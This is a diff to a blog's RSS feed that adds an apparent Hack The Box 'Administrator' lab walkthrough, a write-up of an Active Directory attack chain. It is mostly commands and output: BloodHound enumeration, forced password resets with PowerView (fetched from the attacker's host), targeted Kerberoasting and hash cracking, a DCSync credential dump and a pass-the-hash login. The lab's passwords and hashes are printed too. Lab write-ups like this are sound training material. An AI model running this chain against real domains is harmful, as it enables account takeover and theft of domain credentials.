@@ -6,8 +6,276 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 12 Nov 2024 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Tue, 26 Nov 2024 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://v3l1d.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB: Administrator</title>
+            <link>https://v3l1d.github.io/posts/administrator/</link>
+            <pubDate>Tue, 26 Nov 2024 00:00:00 +0000</pubDate>
+            
+            <guid>https://v3l1d.github.io/posts/administrator/</guid>
+            <description>Overview At machine&amp;rsquo;s deploying HTB gives us credentials:
+Olivia:ichliebedich Port Scanning The Nmap scan was initiated to enumerate open ports, services, and potential vulnerabilities on the target system, administrator.htb (10.10.11.42).
+# Nmap 7.94SVN scan initiated Sat Nov 16 08:09:44 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o scan 10.10.11.42 Nmap scan report for administrator.htb (10.10.11.42) Host is up (0.045s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-16 20:10:38Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.</description>
+            <content type="html"><![CDATA[<p><img src="attachment/466be2feae5c492da78355532032a443.png" alt=""></p>
+<h3 id="overview">Overview</h3>
+<p><img src="attachment/b41c5c3f674047f7889503967e28a493.png" alt=""></p>
+<p>At machine&rsquo;s deploying HTB gives us credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Olivia:ichliebedich
+</code></pre></div><h3 id="port-scanning">Port Scanning</h3>
+<p>The Nmap scan was initiated to enumerate open ports, services, and potential vulnerabilities on the target system, <code>administrator.htb</code> (10.10.11.42).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
+<span style="color:#75715e"># Nmap 7.94SVN scan initiated Sat Nov 16 08:09:44 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o scan 10.10.11.42</span>
+Nmap scan report <span style="color:#66d9ef">for</span> administrator.htb <span style="color:#f92672">(</span>10.10.11.42<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.045s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">988</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-11-16 20:10:38Z<span style="color:#f92672">)</span>
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+3269/tcp open  tcpwrapped
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-11-16T20:10:57
+|_  start_date: N/A
+|_clock-skew: 7h00m45s
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 143/tcp<span style="color:#f92672">)</span>
+HOP RTT      ADDRESS
+<span style="color:#ae81ff">1</span>   43.65 ms 10.10.14.1
+<span style="color:#ae81ff">2</span>   43.87 ms administrator.htb <span style="color:#f92672">(</span>10.10.11.42<span style="color:#f92672">)</span>
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</code></pre></div><h3 id="initial-access">Initial Access</h3>
+<p>Try to login into the machine   using olivia credentials and evil-winrm:</p>
+<p><img src="attachment/221a2e0d013131b4982b59e5fdf7de4e.png" alt=""></p>
+<p>Navigate to <strong>C:\Users</strong> and list users:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Users&gt; dir
+Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/22/2024  11<span style="color:#960050;background-color:#1e0010">:</span>46 AM                Administrator
+d-----        10/30/2024   2<span style="color:#960050;background-color:#1e0010">:</span>25 PM                emily
+d-----        11/16/2024  12<span style="color:#960050;background-color:#1e0010">:</span>20 PM                michael
+d-----        11/16/2024  12<span style="color:#960050;background-color:#1e0010">:</span>19 PM                olivia
+d-r---         10/4/2024  10<span style="color:#960050;background-color:#1e0010">:</span>08 AM                Public
+</code></pre></div><p>We can see here all system&rsquo;s users listed. Let&rsquo;s use BloodHound to scan the entire AD environment generating some <strong>.json</strong> files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Administrator<span style="color:#f92672">]</span>
+└─$ bloodhound-python -c All -u olivia -p <span style="color:#e6db74">&#39;ichliebedich&#39;</span> -d administrator.htb -ns 10.10.11.42
+</code></pre></div><p>These JSON files contain structured data that represent various aspects of the AD environment, including relationships between users, groups, computers, and permissions.</p>
+<p><img src="attachment/4d0ad8097b2459463e290cf3bd3b8f27.png" alt=""></p>
+<h3 id="bloodhound">BloodHound</h3>
+<p>Start neo4j and BloodHound Tool and import the downloaded .json files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neo4j start
+-----------
+bloodhound
+</code></pre></div><p>Login to neo4j DB with your credentials:</p>
+<p><img src="attachment/c9af39aba289bce86c6552eb547d0b64.png" alt=""></p>
+<p>Then upload all <strong>.json</strong> files generated by BloodHound to visualize the data:</p>
+<p><img src="attachment/670d1cba5df76c9efcf8d2bac65b8f8c.png" alt=""></p>
+<p>I used this blog post : <a href="https://blog.netwrix.com/2022/12/09/bloodhound-active-directory/">BloodHound Active Directory</a> to learn how to use BloodHound for privilege escalation and permissions abuse:</p>
+<p><img src="attachment/ccbb9ccd5a628309c257a35ee8a0cb35.png" alt=""></p>
+<p>After importing the json files i followed the below steps:</p>
+<ol>
+<li>
+<p><strong>Searching for OLIVIA@ADMINISTRATOR</strong>: This indicates that you are looking for a user account named &ldquo;Olivia&rdquo; in the &ldquo;Administrator&rdquo; domain. The format &ldquo;OLIVIA@ADMINISTRATOR&rdquo; suggests that Olivia is part of a domain called &ldquo;ADMINISTRATOR.&rdquo;</p>
+</li>
+<li>
+<p><strong>Going under OUTBOUND OBJECT CONTROL</strong>: This refers to a specific section within BloodHound that shows the permissions a user has to control other objects (like users, groups, or computers) in Active Directory. &ldquo;Outbound&rdquo; typically means the permissions that the user can exert over other objects.</p>
+</li>
+<li>
+<p><strong>Running the query Transitive Object Control</strong>: This means you are executing a query that retrieves all permissions Olivia has on other objects, including those granted through group memberships (transitive permissions).</p>
+</li>
+<li>
+<p><strong>We can see all Olivia&rsquo;s permissions</strong>: This implies that after running the query, you can view all the permissions that Olivia has across the Active Directory environment.</p>
+</li>
+</ol>
+<p><img src="attachment/9d9aefc93a9c3b38d9f6ba68aaa47e79.png" alt=""></p>
+<p>Running this query we can see that Olivia has *<em>Generic ALL</em> permissions on MICHEAL</p>
+<p><img src="attachment/31b09cc4382a9f3f598bca5381a83c78.png" alt=""></p>
+<p>And <strong>MICHEAL</strong> has <strong>ForceChangePassword</strong> on <strong>BENJAMIN</strong></p>
+<p><img src="attachment/33cf4af3bdce46643bedd51b07361b23.png" alt=""></p>
+<h3 id="lateral-movement">Lateral Movement</h3>
+<p>We have to gain access to <strong>MICHAEL@HTB</strong> for first abusing permissions. For this task i served of The tips provided by BloodHound:</p>
+<p><img src="attachment/c102dd39ac29c6c17216c85b52e6081d.png" alt=""></p>
+<p>Login into Olivia using <strong>evil-winrm</strong> and follow the steps below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Step 1: Create a secure string for Olivia&#39;s password</span>
+$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;ichliebedich&#39;</span> -AsPlainText -Force
+
+<span style="color:#75715e"># Step 2: Create the PSCredential object for Olivia</span>
+$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;ADMINISTRATOR.HTB\Olivia&#39;</span>, $SecPassword)
+
+<span style="color:#75715e"># Step 3: Create a secure string for the new password you want to set for micheal</span>
+$UserPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;asd1234&#39;</span> -AsPlainText -Force
+
+<span style="color:#75715e"># Step 4: Set micheal&#39;s password using Olivia&#39;s credentials</span>
+Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword -Credential $Cred
+
+</code></pre></div><p><img src="attachment/d86b7be1e9c5f6e3434fce96203f5f90.png" alt=""></p>
+<p><em><strong>WARNING:</strong></em>  to use Set-DomainUserPassword you need to clone <strong>PowerView.ps1</strong> from your attacker machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\o</span>livia<span style="color:#ae81ff">\D</span>ocuments&gt; Invoke-WebRequest -Uri http://10.10.14.218:8888/PowerView.ps1 -OutFile <span style="color:#e6db74">&#34;PowerView.ps1&#34;</span>
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\o</span>livia<span style="color:#ae81ff">\D</span>ocuments&gt; Import-Module .<span style="color:#ae81ff">\P</span>owerView.ps1
+</code></pre></div><p>If the command succeded try to login with new michael&rsquo;s credentials in smb:
+<img src="attachment/16841c18836dc0efa7fe27545f4126e7.png" alt=""></p>
+<h3 id="lateral-movement-2">Lateral Movement 2</h3>
+<p>Now we can login into <strong>Michael</strong> trough evil-winrm and the password we&rsquo;ve setted:</p>
+<p><img src="attachment/367227e617adac1473d768edb8ac9be4.png" alt=""></p>
+<p>As previous, follow the steps indicated in BloodHound about the privileges Micheal have on Benjamin:</p>
+<p><img src="attachment/5b991a3dc4dd3f55e444b671391c048c.png" alt=""></p>
+<p>So replicate the commands below on michael&rsquo;s shell trough evil-winrm:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#Command1</span>
+$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;asd1234&#39;</span> -AsPlainText -Force
+<span style="color:#75715e">#Command2</span>
+$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;ADMINISTRATOR.HTB\michael&#39;</span>, $SecPassword)
+<span style="color:#75715e">#Command3</span>
+$UserPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;asd1234&#39;</span> -AsPlainText -Force
+<span style="color:#75715e">#Command4</span>
+Set-DomainUserPassword -Identity administrator\benjamin -AccountPassword $UserPassword -Credential $Cred
+</code></pre></div><p><img src="attachment/92ddc83830acc9b74104e8edf681a52d.png" alt=""></p>
+<p>With this credentials i tried to login into FTP:</p>
+<p><img src="attachment/781fe399a06064b9247e55ed47a607e4.png" alt=""></p>
+<p>Download this file which is <strong>psafe3</strong> format, use <strong>pswafe2john</strong> to convert into a crackable hash:</p>
+<p><img src="attachment/a650bbccd761200324d72a998993b1fe.png" alt=""></p>
+<p>The output of john for the provided hash is: <strong>tekieromucho</strong>, so open the databse file with PasswordSafe:</p>
+<p><img src="attachment/2a9ea7031b84f67740ffcf1aea86839f.png" alt=""></p>
+<p>Use this password to logiin into <strong>emily</strong> trough evil-winrm:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+</code></pre></div><p><img src="attachment/f0e0022dc751a0343ff1dbcfe2f78609.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">userflag:66e0e43e********
+</code></pre></div><h3 id="privilege-escalation">Privilege escalation</h3>
+<p>Go back in BloodHound and analyze Emily&rsquo;s permissions in the AD environment:</p>
+<p><img src="attachment/4fc6e7885c5d78989dda0ac1e1e10cc9.png" alt=""></p>
+<p>Emily can perform permission abuse on <strong>Ethan</strong> user, trough the process described by BloodHound:</p>
+<h3 id="targeted-kerberoast-attack-steps">Targeted Kerberoast Attack Steps</h3>
+<ol>
+<li>
+<p><strong>Authenticate to the Domain Controller:</strong></p>
+<ul>
+<li>If not running as <code>EMILY@ADMINISTRATOR.HTB</code>, create a PSCredential object:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;asd1234&#39;</span> -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;ADMINISTRATOR.HTB\emily&#39;</span>, $SecPassword)
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><strong>Set the Service Principal Name (SPN):</strong></p>
+<ul>
+<li>Use <code>Set-DomainObject</code> to set the SPN:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname=<span style="color:#e6db74">&#39;nonexistent/BLAHBLAH&#39;</span>}
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><strong>Retrieve the SPN Ticket:</strong></p>
+<ul>
+<li>Use <code>Get-DomainSPNTicket</code> to get the ticket:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainSPNTicket -Credential $Cred harmj0y | fl
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><strong>Crack the Hash:</strong></p>
+<ul>
+<li>The recovered hash can be cracked offline using your preferred tool.</li>
+</ul>
+</li>
+<li>
+<p><strong>Cleanup the Service Principal Name:</strong></p>
+<ul>
+<li>Remove the SPN with <code>Set-DomainObject</code>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
+</code></pre></div></li>
+</ul>
+</li>
+</ol>
+<p>In alternative this operation is performable in a easier way through <a href="https://github.com/ShutdownRepo/targetedKerberoast">Kerberoast</a>:</p>
+<p><img src="attachment/34aae4c4b58ea4382be0fa09b0b52dcf.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>targetedKerberoast-PLNnu4yz<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Administrator/targetedKerberoast<span style="color:#f92672">]</span>
+└─$ python3 targetedKerberoast.py -d <span style="color:#e6db74">&#39;administrator.htb&#39;</span> -u <span style="color:#e6db74">&#39;emily&#39;</span> -p <span style="color:#e6db74">&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting kerberoast attacks
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Fetching usernames from Active Directory with LDAP
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Printing hash <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>ethan<span style="color:#f92672">)</span>
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$5a4d28a476b4656432ecdb37671cfed3$8e94e930833c4901b8ede4acb176e1e95060d7ee357e7307429e52f71004e6c2cd2c394c9adc2cef16939914ffbe77020879849b20fa99c9c6047bed4d4a2b9fb88f5dce1c28afe2953fd70432f41961fbec3cad41455fdbf6d772c0df91779a7e6135ac1bbb37808403674cade95546ac8e1dbc102ded1e5848c84e77146dc6618b07b14b5d9735d0e7cc45fe177b41d5fd06c7b04f5ee6a064e39323cf1dd673558347506fe6d5eea84ae6cc96b38de82de08cab319fd85f386d1d1d96c813f95c6ae3768b43e918f71336b44e03452b2679b1ca9341b30b62f342a08d7b934e96bdbc24871704e2104da0b24ca6bcaacf284ba635525f51d062e4eba017cb2333634558129070e25c4a169f8cd2e349c4696cce541b5aa0af56ec1ac36f9013b6496b2ae7756f437502450d0eb906ce6e2e960dd014cf19f8f04d69f22069e21e200d0900b4fc56577dbec299a31987ba1a61b6751cfb2a1e32d2439d9f2f075debb1e5b600d8af67a0f9603483c5b6fb9682c8314a4ea63f5cb55dd904c527005adfbc9bc6db2c1f1cd3cc0aeca7731db371e9be45900eb51162337ec218fc3296c88bf6a1f56887103c24bfb33509fa94575f2ce3cffb73ddb4cdc4c9216142f8ee77187cbbe84efab4d8d882e965fed0a21aa3f8060f5f11d547123cb69f8488bb7630bb4ad4652f4bd0f200ad3872c8bca2dbec880470a58e545c8ffb041b7839dc49df10e23a28cea96a9761e39e6f343a1f5e9faf547e10f936e1af4dd82beec0bacddc736959a480cc93cec3ff61dd69a4e80b1f6637ffab82774692c6393000e99e7c84841263a84c842f5e51c725d12dab82a6e836872ad435f762d5c462045fd1c6eeebc150af95d87f87530cc545f4f40f7594d7448e00977ba9a04f9ac6329d2c05b334de574cd56a5988fc53d644870214b98d740d13f8c13eb2972840a7c908d4cea13535ce2787f9ceb9c6201d75125c076e14d4f013fcfdb0d07a0af614770e467eb30d09b97be6a52fedccbc9157eb51dd33fe423376606ac0ab856d439bd24009e97e8f0ac09fff4f62d589106c3f211bd903a9f025b1127ee3eb6325d54551ee4f94ec1294b44a2810cefa7c2360ba0028eb0736edefbaec82f15986974957af0101410f5a33138c6a6cf5bba694b463377470156a5c9cb49daded800a6aa0d61fa60658c8a64cd3ec1d026c3646831818daa426a316eb77b5d8497adc8c09b74989ff45990c77abe605f607617e7431cb593171d68094add4f46b10f70fe4398877e1d581b3d7f5caa305b20b1088aecd3469a5a6439954077e2a7f5169f2508bfdfa9ab7924e85896708c999a4ec06ce2d811fd3b4350bcde0d2c0257bb5889a6c75cf206ab594022e257cf4dc51ccb5b0a33600e7cdae0179f94af1b132d0b4e7f75b9dba6c7dd42203c2f45820061c204d4ac090f9d03b5c975b90
+</code></pre></div><p>From hashcat we retrieved that ethan&rsquo;s password is <strong>limpbizkit</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting in autodetect mode  
+  
+Dictionary cache hit:  
+* Filename..: /usr/share/wordlists/rockyou.txt  
+* Passwords.: <span style="color:#ae81ff">14344385</span>  
+* Bytes.....: <span style="color:#ae81ff">139921507</span>  
+* Keyspace..: <span style="color:#ae81ff">14344385</span>  
+  
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$....:limpbizkit  
+                                                            
+Session..........: hashcat  
+Status...........: Cracked  
+Hash.Mode........: <span style="color:#ae81ff">13100</span> <span style="color:#f92672">(</span>Kerberos 5, etype 23, TGS-REP<span style="color:#f92672">)</span>  
+Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....b41be3  
+Time.Started.....: Fri Nov <span style="color:#ae81ff">22</span> 23:27:47 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>  
+Time.Estimated...: Fri Nov <span style="color:#ae81ff">22</span> 23:27:47 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>  
+Kernel.Feature...: Pure Kernel  
+Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>  
+Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>  
+Speed.#1.........:   870.9 kH/s <span style="color:#f92672">(</span>1.17ms<span style="color:#f92672">)</span> @ Accel:512 Loops:1 Thr:1 Vec:8  
+Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>  
+Progress.........: 6144/14344385 <span style="color:#f92672">(</span>0.04%<span style="color:#f92672">)</span>  
+Rejected.........: 0/6144 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>  
+Restore.Point....: 4608/14344385 <span style="color:#f92672">(</span>0.03%<span style="color:#f92672">)</span>  
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1  
+Candidate.Engine.: Device Generator
+</code></pre></div><p>Go back again on bloodhound and check the status of ethan:</p>
+<p><img src="attachment/b0ac69af57f47809a6ca90acc89f11c5.png" alt=""></p>
+<p><strong>DCSync</strong> permissions is abusable, consult this post <a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credential-dumping/dcsync/dcsync-attack">DCSync Attack</a> , so let&rsquo;s try with <a href="https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/">Impacket-SecretsDump</a> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Administrator/targetedKerberoast<span style="color:#f92672">]</span>
+└─$ impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+administrator.htb<span style="color:#ae81ff">\o</span>livia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+administrator.htb<span style="color:#ae81ff">\m</span>ichael:1109:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+administrator.htb<span style="color:#ae81ff">\b</span>enjamin:1110:aad3b435b51404eeaad3b435b51404ee:7bbaa07b15a7a7695e673f201df89dcf:::
+administrator.htb<span style="color:#ae81ff">\e</span>mily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+administrator.htb<span style="color:#ae81ff">\e</span>than:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+administrator.htb<span style="color:#ae81ff">\a</span>lexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+administrator.htb<span style="color:#ae81ff">\e</span>mma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
+Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
+Administrator:des-cbc-md5:403286f7cdf18385
+krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
+krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
+krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
+-----------------------------------
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up... 
+
+</code></pre></div><p><img src="attachment/5833028285c077c9ac819c7c344474ef.png" alt=""></p>
+<p>Use Administrator&rsquo;s to login trough evil-winrm:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
+</code></pre></div><p><img src="attachment/75408c8efcfc4c77cc3662797fb2cf2f.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rootflag:233992c6cab2f94************
+</code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>HTB: Trickster</title>
